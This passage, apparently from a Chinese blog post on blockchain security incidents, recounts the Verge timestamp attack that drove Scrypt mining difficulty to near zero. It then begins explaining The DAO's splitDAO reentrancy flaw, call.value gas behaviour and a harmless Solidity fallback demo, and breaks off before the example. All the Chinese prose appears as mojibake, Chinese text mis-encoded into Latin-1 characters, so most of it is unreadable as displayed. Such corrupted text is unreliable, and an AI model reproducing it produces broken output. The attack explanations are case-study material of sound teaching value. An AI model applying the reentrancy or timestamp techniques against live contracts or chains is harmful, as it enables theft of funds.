<p>ç°åœ¨ï¼Œå¦‚æœæœ‰äººåˆ›å»ºå‡ºè¶³å¤Ÿå¤šçš„é”™è¯¯æ—¶é—´æˆ³ï¼Œé‚£ä¹ˆå°±ä¼šå½±å“Vergeçš„åŒºå—äº§ç”Ÿé€Ÿç‡çš„åˆ¤æ–­ï¼Œä»è€Œé™ä½åŒºå—çš„äº§ç”Ÿéš¾åº¦ã€‚åœ¨é»‘å®¢å‡ æ¬¡æ”»å‡»çš„æ—¶é—´é‡Œï¼Œæ¯éš”ä¸€ä¸ªåŒºå—çš„æäº¤æ—¶é—´æˆ³å¤§çº¦æ¯”åŒºå—åŠ å…¥åŒºå—é“¾çš„æ—¶é—´æ—©ä¸€ä¸ªå°æ—¶ï¼Œè¿™å°±ä½¿å¾—åè®®çš„æŒ–çŸ¿è°ƒæ•´ç®—æ³•è¾“å‡ºç»“æœæƒ¨ä¸å¿ç¹äº†ã€‚å¦‚æœåè®®èƒ½å¤Ÿæµåˆ©åœ°è®²è‹±è¯­çš„è¯ï¼Œå®ƒå°†ä¼šè¯´ï¼šâ€œOh noï¼Not enough blocks have been submitted recentlyï¼Mining must be too difficultâ€”â€”letâ€™s make it easierï¼â€ï¼ˆå“¦ï¼Œä¸ï¼æœ€è¿‘æäº¤çš„åŒºå—æ•°é‡ä¸å¤Ÿï¼æŒ–çŸ¿ç®—æ³•ä¸€å®šæ˜¯å¤ªéš¾äº†â€”â€”è®©æˆ‘ä»¬è°ƒæ•´çš„ç®€å•ä¸€äº›å§ï¼ï¼‰ç”±äºæ—¶é—´æˆ³æŒç»­è¢«ç¯¡æ”¹ï¼Œåè®®æŒç»­é™ä½æŒ–çŸ¿éš¾åº¦ï¼Œç›´åˆ°æŒ–çŸ¿å˜å¾—éå¸¸å®¹æ˜“ã€‚æ€»çš„æ¥è¯´ï¼Œæ”»å‡»å‰å‡ ä¸ªå°æ—¶çš„å¹³å‡éš¾åº¦æ˜¯ 1393093.39131ï¼Œåœ¨æ”»å‡»æœŸé—´å®ƒçš„éš¾åº¦é™ä½åˆ° 0.00024414ï¼Œéš¾åº¦é™ä½äº†è¶…è¿‡ 99.999999%ã€‚æ›´ä½çš„æŒ–æ¬¾éš¾åº¦æ„å‘³ç€èƒ½å¤Ÿæäº¤æ›´å¤šçš„åŒºå—â€”â€”åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤§çº¦æ¯ç§’äº§ç”Ÿä¸€ä¸ªåŒºå—ã€‚</p>
<p>å¦‚æœä»…ä»…æ˜¯è¿™æ ·çš„è¯ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æåˆ°ä»€ä¹ˆå¥½å¤„ï¼Œå› ä¸ºï¼Œå¦‚æœç³»ç»Ÿè°ƒä½äº†äº§ç”ŸåŒºå—çš„éš¾åº¦ï¼Œé‚£ä¹ˆæ‰€æœ‰çŸ¿å·¥çš„éš¾åº¦éƒ½é™ä½äº†ï¼Œæ”»å‡»è€…è¿˜æ˜¯éœ€è¦å’Œå…¶ä»–äººè¿›è¡Œç«äº‰ã€‚è¿™æ—¶ï¼Œå°±éœ€è¦åˆ©ç”¨Vergeçš„å¦ä¸€ä¸ªç‰¹ç‚¹â€”â€”Verge ä½¿ç”¨äº†äº”ç§ç®—æ³•æ˜¯ Scryptï¼ŒX17ï¼ŒLyra2rev2ï¼Œmyrgroestl ä»¥åŠ blake2sä½œä¸ºå·¥ä½œé‡è¯æ˜çš„ç®—æ³•ã€‚ï¼ˆä½œä¸ºå¯¹æ¯”ï¼Œæ¯”ç‰¹å¸æ˜¯SHA256ï¼‰</p>
<p>Vergeåšå‡ºè¿™ä¸ªå†³å®šçš„å‡ºå‘ç‚¹ä¹Ÿæ˜¯éå¸¸å¥½çš„ã€‚å› ä¸ºï¼Œéšç€æ—¶é—´æ¨ç§»ï¼Œæ¯”ç‰¹å¸çŸ¿åœºå˜å¾—è¿‡äºä¸“ä¸šåŒ–å’Œä¸­å¿ƒåŒ–ï¼Œä¾‹å¦‚ï¼Œæ¯”ç‰¹å¸å¤§éƒ¨åˆ†åŒºå—éƒ½æ˜¯ç”± Bitcoin ASIC çŸ¿æœºï¼ˆè¿™ç§çŸ¿æœºä¸“é—¨è®¾è®¡ç”¨äºæŒ–æ¯”ç‰¹å¸ï¼‰äº§ç”Ÿï¼Œå¹¶ä¸”è®¸å¤šæ¯”ç‰¹å¸æ˜¯ç”±å°‘æ•°çŸ¿æ± æŒ–å‡ºæ¥çš„ã€‚Vergeå¼€å‘è€…è®¤ä¸ºï¼Œå¦‚æœä½¿ç”¨5ä¸­ä¸åŒçš„ç®—æ³•ï¼Œä»»ä½•äººæƒ³è¦åŒæ—¶æ§åˆ¶5ç§ç®—æ³•ï¼Œ ä½¿ç”¨5ä¸­ä¸“ç”¨ç¡¬ä»¶ï¼Œéš¾åº¦åº”è¯¥ä¼šé«˜äºåªç”¨ä¸€ç§ç®—æ³•ï¼Œä»è€Œä¿ƒè¿› Verge æŒ–çŸ¿ç»æµæœç€æ›´åˆ†å¸ƒå¼ã€å»ä¸­å¿ƒåŒ–çš„æ–¹å‘å‘å±•ã€‚</p>
<p>è¿™æ ·ï¼Œä¿è¯ç³»ç»Ÿæ­£å¸¸è¿è¡Œçš„æ–¹æ³•æ˜¯ï¼Œæ¯ä¸ªç®—æ³•éƒ½æœ‰<em>è‡ªå·±</em>çš„æŒ–çŸ¿éš¾åº¦å‚æ•°ï¼Œå¹¶ä¸”ç‹¬ç«‹äºå…¶ä½™å››ä¸ªç®—æ³•è¿›è¡Œè°ƒæ•´ï¼Œè¿™æ„å‘³ç€ï¼ŒScrypt çš„æŒ–çŸ¿éš¾åº¦å°†è°ƒæ•´åˆ°æ¯30ç§’äº§ç”Ÿä¸€ä¸ªåŒºå—ï¼ŒX17 åŠå…¶ä»–ä¸‰ç§ç®—æ³•äº¦ç„¶ã€‚ä»è€Œæ•´ä¸ª Verge ç½‘ç»œæ‰èƒ½ä¿è¯æ¯ 30 ç§’äº§ç”Ÿä¸€ä¸ªåŒºå—ã€ä¿æŒå…¨éƒ¨äº”ç§ç®—æ³•çš„æ”¶ç›Šå¯¹äºçŸ¿å·¥æ¥è¯´éƒ½æ˜¯å‡è¡¡çš„ï¼Œå¹¶ç¡®ä¿æ²¡æœ‰ä¸€ç§ç®—æ³•å ä¼˜åŠ¿åœ°ä½ã€‚</p>
<p>è¿™æ„å‘³ç€ä¼ªé€ çš„æ—¶é—´æˆ³å¹¶æ²¡æœ‰é™ä½æ•´ä¸ªç½‘ç»œæŒ–çŸ¿éš¾åº¦ï¼Œè€Œä»…ä»…åªæ˜¯é™ä½äº†äº”ä¸ªç®—æ³•ä¸­çš„ Scryptçš„æŒ–çŸ¿éš¾åº¦ã€‚å› æ­¤ï¼Œå½“ Scrypt çŸ¿å·¥çš„æŒ–çŸ¿éš¾åº¦å¾ˆä½æ—¶ï¼Œå…¶ä»–å››ç§ç®—æ³•çš„çŸ¿å·¥ä¾æ—§å¾—åƒä¹‹å‰ä¸€æ ·åŠªåŠ›å·¥ä½œï¼Œé‚£ä¹ˆå®ƒä»¬çš„å“ˆå¸Œç®—åŠ›å¯¹äºç»´æŠ¤ç½‘ç»œå®‰å…¨å°±æ²¡ç”¨äº†ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œæ”»å‡»è€…ä»…éœ€è¦ä½¿ç”¨ Scrypt ç®—æ³•æŒ–çŸ¿ï¼Œå¹¶ä¸”ä»…éœ€è¦ä¸ä¹Ÿä½¿ç”¨ Srypt æŒ–çŸ¿çš„äººç«äº‰ã€‚å› æ­¤ï¼Œæ”»å‡»è€…æ§åˆ¶ç½‘ç»œæ‰€éœ€çš„å“ˆå¸Œç®—åŠ›ä»å½“åˆçš„è¶…è¿‡50%ï¼ˆåœ¨æ•´ä¸ªç½‘ç»œä¸­å å¤šæ•°ï¼‰ï¼Œä¸‹é™åˆ°ä»…éœ€è¶…è¿‡10%ï¼ˆåœ¨ Scrypt çŸ¿å·¥ä¸­å å¤šæ•°ï¼‰ï¼Œè€ŒReddit è®ºå›ä¸Šæœ‰äººç²—ç•¥åœ°ä¼°è®¡ï¼Œè¿™ä¸ªæ•°å­—ç”šè‡³<a href="https://link.zhihu.com/?target=https://www.reddit.com/r/CryptoCurrency/comments/8a2b99/verge_xvg_mining_exploit_attack_megathread/">ä½è‡³0.4%</a>ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233088.jpg" alt="img">ä½¿ç”¨scryptç®—æ³•äº§ç”Ÿçš„åŒºå—</p>
<p>åœ¨æ”»å‡»äº§ç”Ÿåï¼ŒVergeçš„è‚¡ä»·äº§ç”Ÿäº†æ³¢åŠ¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233089.jpg" alt="img">æ”»å‡»å‘ç”Ÿåï¼Œè‚¡ä»·ä¸‹è·Œ</p>
<p>ä¸‹å›¾æ˜¯5æœˆçš„ç¬¬äºŒæ¬¡æ”»å‡»åäº§ç”Ÿçš„ï¼›æ®è¯´ç¬¬ä¸€æ¬¡æ”»å‡»åä¸€å‘¨ï¼Œåè€Œä¸Šæ¶¨äº†â€¦..</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233090.jpg" alt="img">ä¸€ä¸ªæœˆä¹‹é—´ï¼Œè·Œäº†20%</p>
<p>åº”è¯¥æ¥è¯´ï¼Œä»ä¸­åº”è¯¥å¾—åˆ°çš„æ•™è®­æ˜¯ï¼šå½“æ¶‰åŠç”¨æˆ·é‡‘èèµ„äº§æ—¶ï¼Œåº”æ›´å€¾å‘äºäº‹å®è¯æ˜æ›´è¡Œä¹‹æœ‰æ•ˆçš„æ–¹æ³•ï¼Œå¹¶é˜²æ­¢äº‹æƒ…å˜å¾—è¿‡äºå¤æ‚ï¼Œä»è€Œå¸¦æ¥ä¸å¿…è¦çš„é£é™©ã€‚</p>
<h2 id="THE-DAOæ”»å‡»"><a href="#THE-DAOæ”»å‡»" class="headerlink" title="THE DAOæ”»å‡»"></a>THE DAOæ”»å‡»</h2><p>åœ¨åŒºå—é“¾æŠ€æœ¯é¢†åŸŸï¼ŒThe DAOæ”»å‡»ä¸­ï¼Œé¢å¯¹é»‘å®¢å½“ç€é¢åˆ©ç”¨æ¼æ´æºæºä¸æ–­ä»1.5äº¿ç¾é‡‘çš„ä»¥å¤ªå¸æ± ä¸­æ‹¿èµ°èµ„é‡‘ï¼Œè€Œä¸”è¿˜æ²¡åŠæ³•ã€‚</p>
<p>The DAOé¡¹ç›®æ˜¯åŒºå—é“¾ç‰©è”ç½‘å…¬å¸Slock.itå‘èµ·çš„ä¸€ä¸ªä¼—ç­¹é¡¹ç›®ã€‚THE DAOæ˜¯ä¸€ä¸ªåˆ†æ•£è‡ªæ²»çš„ç»„ç»‡(Decentralized Autonomous Organization),å®ƒçš„ç›®æ ‡æ˜¯ç¼–å†™ä¸€ä¸ªç»„ç»‡çš„è§„åˆ™å’Œå†³ç­–æœºæ„ï¼Œæ¶ˆé™¤å¯¹æ–‡ä»¶å’Œäººå‘˜æ²»ç†çš„éœ€æ±‚ï¼Œå»ºç«‹ä¸€ä¸ªåˆ†æ•£æ§åˆ¶çš„ç»“æ„ã€‚DAOæ˜¯åŒºå—é“¾æ³•åˆ™é‡Œä¸å¯å°‘çš„ä¸€ç¯ï¼Œè€Œthe DAOå«ä¹‰ä¸ºâ€œDAOä¹‹æ¯â€ï¼Œæ˜¯å»ºç«‹åœ¨ä»¥å¤ªåŠä¸Šçš„ä¸€ä¸ªåº”ç”¨ï¼ŒåŠŸèƒ½ç±»ä¼¼äºæŠ•èµ„æœºæ„ã€‚å‚ä¸è€…å¯ä»¥ä½¿ç”¨ä»¥å¤ªå¸æ¥æ¢å–DAOï¼Œä¹Ÿå°±æ˜¯the DAOçš„tokenï¼ŒæŒæœ‰DAOå¯ä»¥å¯¹the DAOçš„æŠ•èµ„å†³ç­–æå‡ºè‡ªå·±çš„æ„è§ã€‚</p>
<p>å®ƒçš„å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>æŠ€æœ¯äººå‘˜ç¼–å†™åœ¨ç»„ç»‡ä¸Šè¿è¡Œçš„æ™ºèƒ½åˆçº¦</li>
<li>åœ¨åˆå§‹èµ„é‡‘å‹Ÿé›†æœŸï¼Œé€šè¿‡è´­ä¹°ä»£è¡¨æ‰€æœ‰æƒçš„tokenä»£å¸æ¥å°†èµ„é‡‘æ³¨å…¥åˆ°DAOé¡¹ç›®ä¸­ï¼Œä¹Ÿå³ICOï¼Œä¸ºé¡¹ç›®æä¾›èµ„é‡‘ï¼ˆTHE DAOä¼—ç­¹çº¦1.5äº¿ç¾å…ƒçš„èµ„é‡‘ï¼Œæ˜¯å½“æ—¶æœ€å¤§çš„ä¼—ç­¹é¡¹ç›®ï¼›è¿œè¶…åˆ›å»ºè€…é¢„æœŸï¼‰</li>
<li>ICOä¹‹åï¼ŒDAOå¼€å§‹è¿ä½œ</li>
<li>åˆ›ä¸šè€…å¯ä»¥ç»™DAOé¡¹ç›®æå‡ºè®®æ¡ˆï¼Œæ‹¥æœ‰TOKENçš„æˆå‘˜äº«æœ‰æŠ•ç¥¨æƒï¼Œé€šè¿‡æŠ•ç¥¨å†³å®šæ˜¯å¦é€šè¿‡è®®æ¡ˆ</li>
</ol>
<p>é¡¹ç›®è¿ä½œç‰¹ç‚¹ï¼š </p>
<ol>
<li>é€šè¿‡æ™ºèƒ½åˆçº¦æ¥ä¸»å¯¼ä»¥å¤ªå¸èµ„é‡‘çš„åˆ†å‘åˆ©ç”¨</li>
<li>å‚ä¸ä¼—ç­¹äººæŒ‰ç…§å‡ºèµ„é‡‘é¢ï¼ˆæ¯”ç‰¹å¸ç­‰ï¼‰ï¼Œè·å¾—ç›¸åº”DAOä»£å¸ï¼Œå³å†…éƒ¨tokenï¼Œå…·æœ‰å®¡æŸ¥åŠæŠ•ç¥¨è¡¨å†³æƒåˆ©</li>
<li>æŠ•èµ„è®®æ¡ˆç”±å…¨ä½“ä»£å¸æŒæœ‰äººæŠ•ç¥¨ï¼Œæ¯ä¸ªä»£å¸ä¸€ç¥¨</li>
<li>é¡¹ç›®æ”¶ç›ŠæŒ‰ç…§ä¸€å®šè§„åˆ™å›é¦ˆä»£å¸æŒæœ‰äºº</li>
</ol>
<p>The DAOé¡¹ç›®äº2016å¹´4æœˆ30æ—¥å¼€å§‹ï¼Œèèµ„çª—å£å¼€æ”¾äº†28å¤©ã€‚ä¸çŸ¥å‡ºäºä»€ä¹ˆåŸå› ï¼Œåæ­£The DAOé¡¹ç›®å°±è¿™ä¹ˆç«èµ·æ¥äº†ï¼Œæˆªæ­¢5æœˆ15æ—¥è¿™ä¸ªé¡¹ç›®ç­¹å¾—äº†è¶…è¿‡ä¸€äº¿ç¾å…ƒï¼Œè€Œåˆ°æ•´ä¸ªèèµ„æœŸç»“æŸï¼Œå…±æœ‰è¶…è¿‡11,000ä½çƒ­æƒ…çš„æˆå‘˜å‚ä¸è¿›æ¥ï¼Œç­¹å¾—1.5äº¿ç¾å…ƒï¼Œæˆä¸ºå†å²ä¸Šæœ€å¤§çš„ä¼—ç­¹é¡¹ç›®ã€‚The DAOæ‰€é›†èµ„çš„é’±è¿œè¿œè¶…è¿‡å…¶åˆ›å»ºè€…çš„é¢„æœŸã€‚</p>
<p>å¯ä»¥è¯´ï¼Œä»–ä»¬çš„å¸‚åœºæˆ˜ç•¥æ¯”ä»–ä»¬èŒèƒ½çš„æ‰§è¡Œæ¥çš„å¥½ï¼Œå› ä¸ºåœ¨ä¼—é”€æœŸé—´ï¼Œå°±æœ‰äººæ‹…å¿ƒå…¶ä»£ç ä¼šå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚6æœˆ17æ—¥å‘ç”Ÿäº†é»‘å®¢æ”»å‡»äº‹ä»¶ï¼Œäº‹ä»¶çš„æ ¹æœ¬åŸå› åœ¨äºä¸€è¡Œæ—©å·²è¢«å‘ç°çš„ä»£ç æ¼æ´ã€‚ åº·å¥ˆå°”å¤§å­¦è®¡ç®—æœºç§‘å­¦ç³»å‰¯æ•™æˆEmin GÃ¼n Sireråœ¨ç»™ä»–çš„ä¸€ä½å­¦ç”Ÿå‘é‚®ä»¶æ—¶æåˆ°ä»–æ­£åœ¨ç ”ç©¶æ™ºèƒ½åˆçº¦ç¬¬666è¡Œä»£ç å¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼Œç”šè‡³åœ¨2016å¹´5æœˆä»½ä¹Ÿå‘¼åè¿‡æŠ•èµ„è€…åœæ­¢å¯¹DAOçš„æŠ•èµ„ï¼Œå› ä¸ºå­˜åœ¨è¿™æ ·çš„å®‰å…¨æ¼æ´ã€‚ä½†æ˜¯ï¼ŒGÃ¼næ•™æˆå¯¹äºä»£ç æ¼æ´æ— èƒ½ä¸ºåŠ›ï¼Œå› ä¸ºä»£ç å‘å¸ƒåœ¨ä»¥å¤ªåŠåŒºå—é“¾ä¸Šå°±æ— æ³•ä¿®æ”¹ã€‚äº‹å®ä¸Šï¼Œå‘ç°è¿™è¡Œä»£ç æ¼æ´çš„å¹¶ä¸æ­¢GÃ¼næ•™æˆï¼Œ2016å¹´6æœˆ9æ—¥ï¼Œåœ¨äº’è”ç½‘ä¸Šå‡ºç°äº†ä¸è¿™æ¬¡é»‘å®¢æ”»å‡»ç›¸åŒæ‰‹æ³•çš„é¢„è­¦ï¼Œ6æœˆ10æ—¥æ™ºèƒ½åˆçº¦è¯­è¨€Solidityçš„ä½œè€… Christianåœ¨ä»¥å¤ªåŠå®˜æ–¹åšå®¢ä¸Šå‘è¡¨æ–‡ç« è¯´æ˜è¿™ä¸ªé—®é¢˜ï¼Œthe DAOå›¢é˜Ÿä¹Ÿæ¥åˆ°äº†å®‰å…¨æŠ¥å‘Šï¼Œä½†åšå‡ºäº†ä¸ä¼šå—åˆ°æ”»å‡»çš„ç»“è®ºã€‚æœ‰ä¸€ç‚¹éœ€è¦é‡ç”³ï¼Œé‚£å°±æ˜¯ä»¥å¤ªåŠç½‘ç»œä¹‹å‰æ²¡æœ‰å‡ºç°è¿‡è¿™ç§æ¼æ´ï¼Œå¹¶ä¸”æ•´ä¸ªæœŸé—´ä¸€ç›´è¿ä½œè‰¯å¥½ã€‚å…¶å®æ‰€æœ‰ç½‘ç»œç³»ç»Ÿéƒ½æœ‰å¯èƒ½ä¼šé­åˆ°å„ç§å„æ ·çš„æ”»å‡»ã€‚è€Œæ”¯æ’‘ä»·å€¼è¶…è¿‡10äº¿ç¾å…ƒï¼ˆæ ¹æ®å¸‚å€¼è®¡ç®—ï¼‰çš„ä»¥å¤ªå¸çš„ä»¥å¤ªåŠç½‘ç»œè¿˜æ²¡æœ‰é‡åˆ°è¿‡é»‘å®¢æ”»å‡»ï¼Œè€Œä¸”å®ƒåŒæ—¶è¿˜åœ¨è¿è¡Œå¾ˆå¤šå…¶ä»–æ™ºèƒ½åˆçº¦ã€‚6æœˆ18æ—¥ï¼Œä¹Ÿå°±æ˜¯å‘¨å…­ï¼Œé»‘å®¢æˆåŠŸæŒ–åˆ°è¶…è¿‡360ä¸‡ä¸ªä»¥å¤ªå¸ï¼Œå¹¶æŠ•å…¥åˆ°ä¸€ä¸ªDAOå­ç»„ç»‡ä¸­ï¼Œè¿™ä¸ªç»„ç»‡å’ŒTHE DAOæœ‰ç€åŒæ ·çš„ç»“æ„ã€‚å½“æ—¶ä»¥å¤ªå¸ä»·æ ¼ä»20å¤šç¾å…ƒç›´æ¥è·Œç ´13ç¾å…ƒã€‚</p>
<p>The DAOçš„æ™ºèƒ½åˆçº¦ä¸­æœ‰ä¸€ä¸ªsplitDAOå‡½æ•°ï¼ŒsplitDAOçš„æœ¬æ„æ˜¯è¦ä¿æŠ¤æŠ•ç¥¨ä¸­å¤„äºå¼±åŠ¿åœ°ä½çš„å°‘æ•°æ´¾é˜²æ­¢ä»–ä»¬è¢«å¤šæ•°æ´¾é€šè¿‡æŠ•ç¥¨çš„æ–¹å¼åˆæ³•å‰¥å‰Šã€‚é€šè¿‡åˆ†è£‚å‡ºä¸€ä¸ªå°è§„æ¨¡çš„DAOï¼Œç»™äºˆä»–ä»¬ä¸€ä¸ªç”¨è„šæŠ•ç¥¨çš„æœºåˆ¶ï¼ŒåŒæ—¶ä»ç„¶ç¡®ä¿ä»–ä»¬å¯ä»¥è·å–åˆ†è£‚å‰è¿›è¡Œçš„å¯¹å¤–èµ„åŠ©äº§ç”Ÿçš„å¯èƒ½æ”¶ç›Šã€‚</p>
<p>æ”»å‡»è€…é€šè¿‡æ­¤å‡½æ•°ä¸­çš„æ¼æ´é‡å¤åˆ©ç”¨è‡ªå·±çš„DAOèµ„äº§æ¥ä¸æ–­ä»TheDAOé¡¹ç›®çš„èµ„äº§æ± ä¸­åˆ†ç¦»DAOèµ„äº§ç»™è‡ªå·±ã€‚</p>
<p>åœ¨DAO.solä¸­ï¼Œfunction splitDAOå‡½æ•°æœ‰è¿™æ ·ä¸€è¡Œï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233091.jpg" alt="img"></p>
<p>ç„¶åï¼ŒwithdrawRewardForçš„å®ç°å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233092.jpg" alt="img"></p>
<p>å†çœ‹payOutå‡½æ•°è°ƒç”¨ã€‚rewardAccountçš„ç±»å‹æ˜¯ManagedAccountï¼Œåœ¨ManagedAccount.solä¸­å¯ä»¥çœ‹åˆ°ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233093.jpg" alt="img"></p>
<p>å…³äºä»¥ä¸Šä»£ç ä¸ºä½•ä¼šå¯¼è‡´æ”»å‡»ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ã€‚</p>
<p>æ—¢ç„¶ä»¥å¤ªå¸æ˜¯ä½œä¸ºç”µå­è´§å¸ï¼Œé‚£ä¹ˆè‡ªç„¶ä¼šæœ‰äº¤æ˜“ï¼Œä¹Ÿå³send()å’Œreceive()ã€‚ä»¥å¤ªåŠä¸Šçš„ç¼–ç¨‹è¯­è¨€solidityæä¾›äº†ä¸‰ç§æ–¹æ³•å®ç°sendåŠŸèƒ½ã€‚åˆ†åˆ«æ˜¯address.sendï¼Œaddress.transferå’Œaddress.call.valueã€‚</p>
<p>Solidity ä¸­ <code>&lt;address&gt;.transfer()</code>ï¼Œ<code>&lt;address&gt;.send()</code> å’Œ <code>&lt;address&gt;.gas().call.value()()</code> éƒ½å¯ä»¥ç”¨äºå‘æŸä¸€åœ°å€å‘é€ etherï¼Œä»–ä»¬çš„åŒºåˆ«åœ¨äºï¼š</p>
<p><strong><address>.transfer()</strong></p>
<ul>
<li>å½“å‘é€å¤±è´¥æ—¶ä¼š <code>throw;</code> å›æ»šçŠ¶æ€</li>
<li>åªä¼šä¼ é€’ 2300 Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li>
</ul>
<p><strong><address>.send()</strong></p>
<ul>
<li>å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å› <code>false</code> å¸ƒå°”å€¼</li>
<li>åªä¼šä¼ é€’ 2300 Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li>
</ul>
<p><strong><address>.gas().call.value()()</strong></p>
<ul>
<li>å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å› <code>false</code> å¸ƒå°”å€¼</li>
<li>ä¼ é€’æ‰€æœ‰å¯ç”¨ Gas è¿›è¡Œè°ƒç”¨ï¼ˆå¯é€šè¿‡ <code>gas(gas_value)</code> è¿›è¡Œé™åˆ¶ï¼‰ï¼Œä¸èƒ½æœ‰æ•ˆé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li>
</ul>
<p>å¦‚ä½•ç†è§£é˜²æ­¢é‡å…¥å‘¢ï¼ŸåŸºæœ¬æ¥è¯´ï¼Œæ”»å‡»è€…è¦æƒ³å®ç°æ”»å‡»ï¼Œéœ€è¦è®©å—å®³è€…æ‰§è¡Œè‡ªå·±çš„ä»£ç ã€‚è€Œå› ä¸ºsendå’Œtransferéƒ½åªèƒ½ä½¿ç”¨2300çš„gasï¼Œä¹Ÿå³å½“æ‰§è¡Œå®Œä¸€å°æ®µä»£ç ä¹‹åï¼Œè¦ä¹ˆæˆåŠŸè¿”å›ï¼Œè¦ä¹ˆgasè€—å°½ï¼Œä»è€Œè®©æ”»å‡»è€…æ‰€èƒ½åšçš„æ“ä½œç›¸å½“æœ‰é™ã€‚call.valueä¸å­˜åœ¨è¿™ä¸ªé™åˆ¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯è¦å°†æ­£å¸¸çš„æ“ä½œæµç¨‹å¯¼å‘æ”»å‡»è€…çš„ä»£ç ã€‚</p>
<p>solidityè¿˜æä¾›äº†ä¸€ä¸ªç‰¹æ€§ï¼š</p>
<h3 id="å›é€€å‡½æ•°-fallback"><a href="#å›é€€å‡½æ•°-fallback" class="headerlink" title="å›é€€å‡½æ•° - fallback()"></a>å›é€€å‡½æ•° - fallback()</h3><p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<blockquote>
<p><strong>A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</strong></p>
</blockquote>
<p>ä¸€ä¸ªåˆçº¦å¯ä»¥å…·æœ‰ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè¯¥å‡½æ•°æ²¡æœ‰å‚æ•°ä¹Ÿæ²¡æœ‰è¿”å›å€¼ã€‚å½“è¯¥åˆçº¦è¢«è°ƒç”¨æ—¶æ‰¾ä¸åˆ°åŒ¹é…çš„å‡½æ•°åï¼Œæˆ–è€…è¯´è¢«è°ƒç”¨æ—¶æ²¡æœ‰æä¾›å‚æ•°ï¼Œé‚£ä¹ˆå°±è°ƒç”¨fallback å‡½æ•°ã€‚</p>
<blockquote>
<p>pragma solidity ^0.4.0;</p>
<p>contract SimpleFallback{<br><strong>function</strong>(){<br><em>&#x2F;&#x2F;fallback function</em><br>}<br>}</p>
</blockquote>
<p>å¦å¤–ï¼Œå½“ä½¿ç”¨<code>address.send(ether to send)</code>å‘æŸä¸ªåˆçº¦ç›´æ¥è½¬å¸æ—¶ï¼Œç”±äºè¿™ä¸ªè¡Œä¸ºæ²¡æœ‰å‘é€ä»»ä½•æ•°æ®ï¼Œæ‰€ä»¥æ¥æ”¶åˆçº¦æ€»æ˜¯ä¼šè°ƒç”¨fallbackå‡½æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€å®šè¦å®šä¹‰fallbackå‡½æ•°ï¼Œå¹¶ä¸”fallbackå‡½æ•°è¿˜å¿…é¡»ä½¿ç”¨Payableä¿®é¥°ï¼Œå¦åˆ™sendä¼šæŠ¥é”™ã€‚æ­£æ˜¯å› ä¸ºå¦‚æ­¤ï¼Œæ‰€ä»¥å¯¹sendå‡½æ•°åšäº†ä¸€å®šçš„é™åˆ¶ï¼Œgasåªèƒ½ä½¿ç”¨2300ã€‚è¿™æ ·ï¼Œä¸‹è¿°è¡Œä¸ºæ¶ˆè€—çš„gaséƒ½å°†è¶…è¿‡fallbackå‡½æ•°é™å®šçš„gaså€¼ï¼š</p>
<ul>
<li>å‘åŒºå—é“¾ä¸­å†™æ•°æ®</li>
<li>åˆ›å»ºä¸€ä¸ªåˆçº¦</li>
<li>è°ƒç”¨ä¸€ä¸ªexternalçš„å‡½æ•°</li>
<li>å‘é€ether</li>
</ul>
<p>æ‰€ä»¥ä¸€èˆ¬ï¼Œæˆ‘ä»¬åªèƒ½åœ¨fallbackå‡½æ•°ä¸­è¿›è¡Œä¸€äº›æ—¥å¿—æ“ä½œï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract FallbackFailOnGasLimit&#123;</span><br><span class="line">  uint someStorage;</span><br><span class="line"></span><br><span class="line">  event fallbackTrigged(bytes);</span><br><span class="line">  function() payable&#123;</span><br><span class="line">    fallbackTrigged(msg.data);</span><br><span class="line">    //å°†å› ä¸ºå†™å…¥æ“ä½œå¤±è´¥ï¼Œæ³¨é‡Šæ‰ä¸‹é¢è¿™è¡Œï¼Œå°†ä¼šæ‰§è¡ŒæˆåŠŸ</span><br><span class="line">    someStorage = 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function callFallback() returns (bool)&#123;</span><br><span class="line">    return this.send(0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¯¹call.valueæ²¡æœ‰2300 gasçš„é™åˆ¶ã€‚å¦‚æœåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­æ²¡æœ‰è®¾ç½®gasçš„å€¼ï¼Œé‚£ä¹ˆä¼šä¸€ç›´è¿è¡Œç›´åˆ°è€—å°½æ‰€æœ‰çš„gasã€‚ä¹Ÿå³ï¼Œå¦‚æœæƒ³è¦æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå¤šå‡†å¤‡ç‚¹gaså°±å¥½ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ã€‚</p>
